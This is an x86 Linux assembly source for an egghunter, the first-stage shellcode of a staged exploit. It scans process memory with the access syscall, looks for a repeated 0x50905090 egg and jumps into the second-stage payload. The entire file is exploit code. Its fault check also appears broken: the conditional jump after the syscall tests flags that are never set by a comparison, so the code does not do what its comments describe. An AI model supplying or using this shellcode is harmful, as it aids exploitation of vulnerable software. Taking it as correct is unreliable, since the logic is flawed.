global _start
section .text
_start: 
    xor ecx, ecx            ; clear ecx 
    mul ecx                 ; sets ecx, eax, edx to 0 
    cld
align_page:
    or dx,0xfff             ; initial page size = 4095
check_addr:
    inc edx                 ; increase page size to 4096
    lea ebx, [edx+0x4]      ; load page into ebx
    push byte 0x21
    pop eax          ; mov sys_access into eax
    int 0x80
    jz align_page           ; if zflag = 0 (EFAULT is returned), we need to skip this block
    mov eax,0x50905090      ; mov egg key into eax
    mov edi, edx            ; mov the address pointed by edx into edi
    scasd                   ; scasd will compare the contents stored in edi with eax (0x50905090)
    jnz check_addr          ; if the key is not found jump to the next address and compare 
    scasd
    jnz check_addr          ; if the key is not found jump to the next address and compare 
    jmp edi                 ; execute the second stage
